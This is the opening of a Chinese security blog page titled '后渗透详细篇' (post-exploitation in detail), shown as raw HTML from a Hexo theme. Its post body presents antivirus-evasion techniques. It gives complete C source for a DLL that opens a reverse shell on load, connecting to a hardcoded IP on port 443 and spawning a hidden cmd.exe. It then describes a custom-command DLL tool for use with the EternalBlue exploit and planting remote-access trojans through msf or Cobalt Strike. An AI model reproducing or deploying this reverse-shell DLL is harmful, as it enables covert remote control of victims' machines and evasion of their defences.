@@ -1,0 +1,1255 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="0x01 免杀技术一、dll 免杀dll nc 免杀版本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485// dllmain">
+<meta name="keywords" content="bypass,后渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="后渗透详细篇">
+<meta property="og:url" content="https://wh0ale.github.io/2019/01/23/2019-1-23-后渗透详解/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="0x01 免杀技术一、dll 免杀dll nc 免杀版本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485// dllmain">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1fzge5n0mezj212y0fsmzp.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1fzgf4qgo9aj20gm0k8q4o.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1fzgfarpa9vg20m60fgazm.gif">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1fzgfayzv43g20m60fgkfq.gif">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1fzgfb6mobig20m80fh7wh.gif">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3kzc2zdyj20zw082wh5.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fzgeno8savj20kq0370tf.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3l0gc3gwj20hs0c63yr.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3l0zh7chj20ig0dnmxf.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3l3yess7j20pn05kaa6.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3l4f4h62j20zk0qx10g.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3l5wtadsj20uw0fjduq.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3l7f5ba2j20iw05m76m.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3l80v1dij20el0b5jry.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fz3l9buhhjj211x0buwsa.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyehrf4diqj211z09oq5i.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyehvgal9qj20z10eejt9.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyehvqrnfsj211y0kb43g.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyehvz10mtj20iv0jv40n.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyehw5aawkj20j00jp76v.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyehwb3qxvj20jc0kfacq.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyehwg1wxij20iw05i74x.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyehwk95jjj20jc0kfn01.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1fyehwohiwyj20jc0kfq6b.jpg">
+<meta property="og:image" content="https://i0.wp.com/3.bp.blogspot.com/-vRQoGXf6Hxc/XERxDCNVrRI/AAAAAAAAcIA/-HNjlqYKAjQpdD2BUOGPCfcE3-Qn1RfwwCLcBGAs/s1600/1.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/3.bp.blogspot.com/-WojuVBITUBA/XERxFcLMnDI/AAAAAAAAcIc/VIRbJgR_0KMAonf3QaFGRwgJ9zF2xFgjQCLcBGAs/s1600/2.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/2.bp.blogspot.com/-LxXWG6Wp9tA/XERxHkuPN8I/AAAAAAAAcI8/-Cs5h6XR0jg1nqOG_qg7NH0LcJo1wJ2lwCLcBGAs/s1600/3.png?w=687&ssl=1">
+<meta property="og:image" content="https://i1.wp.com/4.bp.blogspot.com/-9RiWJSgc9kc/XERxKTU-01I/AAAAAAAAcJo/8zVtmo3pB_oHEiS2jutBghqlEEMFGZvpwCLcBGAs/s1600/9.png?w=687&ssl=1">
+<meta property="og:image" content="https://i0.wp.com/1.bp.blogspot.com/-DoAZZYKv1GY/XERxDGuR4DI/AAAAAAAAcIE/ajlIITUcoZw9M4H6AtJz34kvNUo9YYFfQCLcBGAs/s1600/10.png?w=687&ssl=1">
+<meta property="og:image" content="https://i0.wp.com/4.bp.blogspot.com/-3C7oXVJUYzk/XERxDXzYtCI/AAAAAAAAcII/V1mhJdqQq7IUHP0uWAoYd46qmWk-2uIyQCLcBGAs/s1600/11.png?w=687&ssl=1">
+<meta property="og:image" content="https://i1.wp.com/2.bp.blogspot.com/-p0QEInqkcx8/XERxEfHkFXI/AAAAAAAAcIM/f6J6-fwsWCMa-4fCq5uiLAHZB3gCF-9bgCLcBGAs/s1600/12.png?w=687&ssl=1">
+<meta property="og:image" content="https://i1.wp.com/3.bp.blogspot.com/-OB5nghnOldk/XERxEnRo8GI/AAAAAAAAcIU/2wefsko02AElgdWTQJZeWLjo3cYUFhBLQCLcBGAs/s1600/13.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/3.bp.blogspot.com/-_ix5g4_sjyQ/XERxEQYpoyI/AAAAAAAAcIQ/Xu9F9xQFugMGM0-dTZHfqbR9szpv6K3fgCLcBGAs/s1600/14.png?w=687&ssl=1">
+<meta property="og:image" content="https://i1.wp.com/4.bp.blogspot.com/-u4xQqtgWTyY/XERxE1CnEoI/AAAAAAAAcIY/gbDs9afuMVEdYu4CmTBD1dFAVV0X5WXWgCLcBGAs/s1600/19.png?w=687&ssl=1">
+<meta property="og:image" content="https://i1.wp.com/3.bp.blogspot.com/-bDtjVsVqCfI/XERxFnef2HI/AAAAAAAAcIg/2lWy09_8hCUan9rgSBKoSPXf98Dq4uCwwCLcBGAs/s1600/20.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/2.bp.blogspot.com/-kzB3IOsqd7E/XERxFqRFN-I/AAAAAAAAcIk/EGkn94fq-WsFUDnMc3K3981c0psvCnYowCLcBGAs/s1600/21.png?w=687&ssl=1">
+<meta property="og:image" content="https://i0.wp.com/4.bp.blogspot.com/-w3C510CQUwc/XERxGDKDzWI/AAAAAAAAcIo/t7-aghYUo7EMgY6zJp71jfELNm85oIhXgCLcBGAs/s1600/24.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/4.bp.blogspot.com/-AuWS47ZUX7M/XERxGKIaPjI/AAAAAAAAcIw/t2eKFIIM9Go94YdhULnl25q0ESt8k5bjwCLcBGAs/s1600/25.png?w=687&ssl=1">
+<meta property="og:image" content="https://i1.wp.com/4.bp.blogspot.com/-pUe8murtpZ8/XERxGFr0IdI/AAAAAAAAcIs/DE_vK8GP4kYQUGTVRsYeQL7f7UP54Z9vwCLcBGAs/s1600/26.png?w=687&ssl=1">
+<meta property="og:image" content="https://i0.wp.com/1.bp.blogspot.com/-OdUOi3cMRQs/XERxGnqbssI/AAAAAAAAcI0/SEKI54JsGeYJXEibvsA_6tlJh0k5qiDFwCLcBGAs/s1600/27.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/4.bp.blogspot.com/-0CmovKHOJrM/XERxHCRIPnI/AAAAAAAAcI4/ObUMBfxp2uk-erbTVLlt3Dw9XuzTBBkCACLcBGAs/s1600/28.png?w=687&ssl=1">
+<meta property="og:image" content="https://i1.wp.com/1.bp.blogspot.com/-4Mnl67YAD6s/XERxH_3GZjI/AAAAAAAAcJA/Uvop5v5QilMx_yYqc65rFYT7oVLhg5uvgCLcBGAs/s1600/29.png?w=687&ssl=1">
+<meta property="og:image" content="https://i1.wp.com/1.bp.blogspot.com/-pBOo1dseDgE/XERxH0We7tI/AAAAAAAAcJE/5RCKtv1aKGAfV7zFzqYUY1Xjh61G7ALbwCLcBGAs/s1600/30.1.png?w=687&ssl=1">
+<meta property="og:image" content="https://i1.wp.com/1.bp.blogspot.com/-PvnGPj2GVGA/XERxIFksOFI/AAAAAAAAcJI/4yLhVGVqkvg_pnQgLq0fKjejrLkjpF_jgCLcBGAs/s1600/30.2.png?w=687&ssl=1">
+<meta property="og:image" content="https://i0.wp.com/2.bp.blogspot.com/-aymk9tuvy9g/XERxImvP91I/AAAAAAAAcJM/De-FehRxf4s7irNF2M7VFA8m8Am1KJxrgCLcBGAs/s1600/30.3.png?w=687&ssl=1">
+<meta property="og:image" content="https://i0.wp.com/3.bp.blogspot.com/-vGSOtlKLyf8/XERxIg5stDI/AAAAAAAAcJU/v6tyxgZArS4nnRoEPCUeyU1Nq3kRug3ZgCLcBGAs/s1600/30.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/2.bp.blogspot.com/-8GkhktI-SyM/XERxIgj3uCI/AAAAAAAAcJQ/rRqB1uqd1DYLxa8iC7Gb-wOeqmdt1Jx4wCLcBGAs/s1600/31.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/1.bp.blogspot.com/-Q9pZ_B32-vQ/XERxI4lTSlI/AAAAAAAAcJY/Tb_i1u2XXBUFsmhQJlP_KIcIMK2Hl9OBgCLcBGAs/s1600/32.png?w=687&ssl=1">
+<meta property="og:image" content="https://i1.wp.com/3.bp.blogspot.com/-Vr3Ajw9K7VE/XERxJ51_aTI/AAAAAAAAcJg/yjMRQ_m7kDM3-eb4F30bjGCmUYRNnMnjQCLcBGAs/s1600/36.png?w=687&ssl=1">
+<meta property="og:image" content="https://i2.wp.com/4.bp.blogspot.com/-128j7cQgiIw/XERxJrwmPDI/AAAAAAAAcJc/E6fOncwHWFkqByePbnTMoWstqBamuaL3wCLcBGAs/s1600/37.png?w=687&ssl=1">
+<meta property="og:image" content="https://i0.wp.com/3.bp.blogspot.com/-L7nvBm5Sd48/XERxKDpMKhI/AAAAAAAAcJk/R8u8I_loOnkqUvRf1pqXZ3K6ZRxv2O90wCLcBGAs/s1600/38.png?w=687&ssl=1">
+<meta property="og:updated_time" content="2019-09-06T06:03:19.357Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="后渗透详细篇">
+<meta name="twitter:description" content="0x01 免杀技术一、dll 免杀dll nc 免杀版本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485// dllmain">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1fzge5n0mezj212y0fsmzp.jpg">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/01/23/2019-1-23-后渗透详解/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>后渗透详细篇 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/01/23/2019-1-23-后渗透详解/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">后渗透详细篇
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-01-23 00:00:00" itemprop="dateCreated datePublished" datetime="2019-01-23T00:00:00+08:00">2019-01-23</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-09-06 14:03:19" itemprop="dateModified" datetime="2019-09-06T14:03:19+08:00">2019-09-06</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">16k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">15 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <h1 id="0x01-免杀技术"><a href="#0x01-免杀技术" class="headerlink" title="0x01 免杀技术"></a>0x01 免杀技术</h1><h2 id="一、dll-免杀"><a href="#一、dll-免杀" class="headerlink" title="一、dll 免杀"></a>一、dll 免杀</h2><p>dll nc 免杀版本</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32"</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse_shell</span><span class="params">()</span></span>;</span><br><span class="line">WSADATA wsaData;</span><br><span class="line">SOCKET Winsock;</span><br><span class="line">SOCKET Sock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">hax</span>;</span></span><br><span class="line"></span><br><span class="line">STARTUPINFO ini_processo;</span><br><span class="line">PROCESS_INFORMATION processo_info;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (dwReason)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">                reverse_shell();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        LPCSTR szMyUniqueNamedEvent = <span class="string">"sysnullevt"</span>;</span><br><span class="line">        HANDLE m_hEvent = CreateEventA(<span class="literal">NULL</span>, TRUE, FALSE, szMyUniqueNamedEvent);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (GetLastError())</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="comment">// app is already running</span></span><br><span class="line">        <span class="keyword">case</span> ERROR_ALREADY_EXISTS:</span><br><span class="line">        &#123;</span><br><span class="line">                                                                 CloseHandle(m_hEvent);</span><br><span class="line">                                                                 <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> ERROR_SUCCESS:</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">                                                  <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">        Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        hax.sin_family = AF_INET;</span><br><span class="line">        hax.sin_port = htons(atoi(<span class="string">"443"</span>));</span><br><span class="line"></span><br><span class="line">        hax.sin_addr.s_addr = inet_addr(<span class="string">"172.31.139.141"</span>);</span><br><span class="line">        WSAConnect(Winsock, (SOCKADDR*)&amp;hax, <span class="keyword">sizeof</span>(hax), <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(&amp;ini_processo, <span class="number">0</span>, <span class="keyword">sizeof</span>(ini_processo));</span><br><span class="line">        ini_processo.cb = <span class="keyword">sizeof</span>(ini_processo);</span><br><span class="line">        ini_processo.dwFlags = STARTF_USESTDHANDLES;</span><br><span class="line">        ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;</span><br><span class="line"></span><br><span class="line">        CreateProcessA(<span class="literal">NULL</span>, <span class="string">"cmd.exe"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, CREATE_NO_WINDOW, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOA)&amp;ini_processo, &amp;processo_info);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1fzge5n0mezj212y0fsmzp.jpg" alt></p>
+<p>服务端免杀：<br><a href="https://www.t00ls.net/viewthread.php?tid=46304&amp;highlight=nc" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=46304&amp;highlight=nc</a></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1fzgf4qgo9aj20gm0k8q4o.jpg" alt></p>
+<h2 id="二、custom-command-dll"><a href="#二、custom-command-dll" class="headerlink" title="二、custom_command_dll"></a>二、custom_command_dll</h2><p>自定义命令的dll</p>
+<p>最近在测试一个项目的时候，远程代理回来搞内网，使用永恒之蓝打内网好不方便，用之前坛子里的nc.dll也不行，毕竟是代理，不好用nc反弹。于是有自定义命令的dll，那将方便很多。</p>
+<p>成品</p>
+<p>custom_dll.exe，支持32和64位dll的生成，其实32的在64位的系统也能运行，为什么还要64位的呢？？因为NSA的rundll模块需要匹配位数的。工具是交互式输出的，不多说了，来几张图：</p>
+<p>运行个任务管理器：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1fzgfarpa9vg20m60fgazm.gif" alt></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1fzgfayzv43g20m60fgkfq.gif" alt></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dgy1fzgfb6mobig20m80fh7wh.gif" alt></p>
+<p>种个远控木马，用msf或者cobalt strike：</p>
+<p><a href="http://192.168.1.105:8080/test.txt" target="_blank" rel="noopener">http://192.168.1.105:8080/test.txt</a></p>
